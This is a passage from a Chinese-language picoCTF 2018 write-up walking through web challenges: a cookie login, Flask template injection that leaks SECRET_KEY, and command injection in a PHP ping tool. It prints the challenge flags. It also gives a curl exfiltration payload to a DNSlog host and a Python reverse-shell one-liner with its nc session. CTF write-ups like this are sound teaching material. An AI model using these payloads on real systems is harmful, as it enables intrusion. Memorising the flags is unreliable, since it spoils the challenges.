    HOST:flag.local
    # 返回
    HTTP/1.1 200 OK
    x-powered-by: Express
    content-type: text/html; charset=utf-8
    content-length: 498
    etag: W/"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"
    date: Mon, 15 Oct 2018 17:06:06 GMT
    connection: close
                        Real Business Internal Flag Server
                        Login
                        Log In
            %
然后`POST`发送题目给的用户名和密码。
    # 请求
    POST /login HTTP/1.1
    Host: flag.local
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38
    user=realbusinessuser&pass=potoooooooo
    # 返回
    HTTP/1.1 302 Found
    x-powered-by: Express
    set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
    location: /
    vary: Accept
    content-type: text/plain; charset=utf-8
    content-length: 23
    date: Mon, 15 Oct 2018 17:08:18 GMT
    connection: close
    Found. Redirecting to /%
返回一个302，并且带有一个`cookie`，用这个`cookie`再访问一次`/`，得到flag。
    # 请求
    GET / HTTP/1.1
    HOST:flag.local
    cookie:real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D;
    # 返回
    HTTP/1.1 200 OK
    x-powered-by: Express
    content-type: text/html; charset=utf-8
    content-length: 438
    etag: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"
    date: Mon, 15 Oct 2018 17:10:13 GMT
    connection: close
                        Real Business Internal Flag Server
                        Real Business Employee
                        Logout
                        Hello Real Business Employee!  Today's flag is: picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}.
            %
flag:`picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}`
# Flaskcards
## Question
> We found this fishy [website](http://2018shell1.picoctf.com:23547/) for
> flashcards that we think may be sending secrets. Could you take a look?
### Hint
> Are there any common vulnerabilities with the backend of the website?
>
> Is there anywhere that filtering doesn't get applied?
>
> The database gets reverted every 2 hours so your session might end
> unexpectedly. Just make another user
## Solution
从题目名字推测网站用的应该是flask框架，根据hint来看应该是SSTI漏洞。
访问 1+1
}}，并没有返回特殊的数据，说明网站错误机制应该没有问题，切入点不在这。注册账号并登陆，发现多了`Creating cards`、`Listing
cards`。
在`Creating cards`的Question和answer处输入 _{{1+1}}_ ，然后切换到`Listing
Cards`，发现两处都变成了2而不是1。
读取 _{{ config.items() }}_ ，发现`secretkey`就是flag。
    dict_items([('DEBUG', False), ('PREFERRED_URL_SCHEME', 'http'), ('SQLALCHEMY_POOL_TIMEOUT', None), ('JSON_AS_ASCII', True),
    ('PROPAGATE_EXCEPTIONS', None), ('ENV', 'production'), ('SQLALCHEMY_POOL_RECYCLE', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)),
    ('JSON_SORT_KEYS', True), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SERVER_NAME', None), ('TRAP_BAD_REQUEST_ERRORS', None),
    ('MAX_COOKIE_SIZE', 4093), ('USE_X_SENDFILE', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None),
    ('APPLICATION_ROOT', '/'), ('BOOTSTRAP_USE_MINIFIED', True), ('MAX_CONTENT_LENGTH', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True),
    ('TRAP_HTTP_EXCEPTIONS', False), ('SESSION_COOKIE_PATH', None), ('TESTING', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False),
    ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SQLALCHEMY_POOL_SIZE', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_NAME', 'session'),
    ('SESSION_COOKIE_SECURE', False), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('TEMPLATES_AUTO_RELOAD', None), ('SESSION_COOKIE_SAMESITE', None),
    ('JSONIFY_MIMETYPE', 'application/json'), ('SQLALCHEMY_RECORD_QUERIES', None), ('SESSION_COOKIE_DOMAIN', False), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)),
    ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SQLALCHEMY_ECHO', False),
    ('BOOTSTRAP_SERVE_LOCAL', False), ('BOOTSTRAP_CDN_FORCE_SSL', False),
    ('SECRET_KEY', 'picoCTF{secret_keys_to_the_kingdom_584f8327}'),
    ('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_MAX_OVERFLOW', None)])
flag:`picoCTF{secret_keys_to_the_kingdom_584f8327}`
# fancy-alive-monitoring
## Question
> One of my school mate developed an alive monitoring tool. Can you get a flag
> from
> [http://2018shell1.picoctf.com:31070](http://2018shell1.picoctf.com:31070/)([link](http://2018shell1.picoctf.com:31070/))?
### Hint
> This application uses the validation check both on the client side and on
> the server side, but the server check seems to be inappropriate.
>
> You should be able to listen through the shell on the server.
## Solution
查看源码，输入处有js检查，表单处有正则检查。
        Monitoring Tool
        Monitoring Tool ver 0.1
         Input IP address of the target host
    Target is NOT alive.");
                    break;
                } else if (strpos($str, ', 0% packet loss') !== false){
                    printf("Target is alive.");
                    break;
                }
            }
        } else {
            echo "Wrong IP Format.";
        }
    }
    ?>
    index.php source code
js检查可以直接忽略，关键看正则过滤。
    ...
    if ($ip) {
        // super fancy regex check!
        if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) 
    ...
正则结尾没有写`$`，所以ip后面可以插入任意字符。页面没有命令回显，就可以用DNSlog查看命令执行返回的信息。
输入 `ip=0.0.0.0;curl http://40zqma.ceye.io/`whoami`` 发现可以收到回显。
也可以直接反弹shell，更方便。使用python来反弹shell。
    ip=0.0.0.0;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_vps_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
在vps上开启nc监听。
    ~ nc -lvvp 8888
    Listening on [0.0.0.0] (family 0, port 8888)
    Connection from [18.224.157.204] port 8888 [tcp/*] accepted (family 2, sport 42170)
    /bin/dash: 0: can't access tty; job control turned off
    $ ls
    index.php
    index.txt
    the-secret-1335-flag.txt
    xinet_startup.sh
    $ cat the-secret-1335-flag.txt
    Here is your flag: picoCTF{n3v3r_trust_a_b0x_d7ad162d}
flag:`picoCTF{n3v3r_trust_a_b0x_d7ad162d}`
# Help Me Reset 2
## Question
> There is a website running at
> [http://2018shell1.picoctf.com:19054](http://2018shell1.picoctf.com:19054/)
> ([link](http://2018shell1.picoctf.com:19054/)). We need to get into any user
> for a flag!
### Hint
> Try looking past the typical vulnerabilities. Think about possible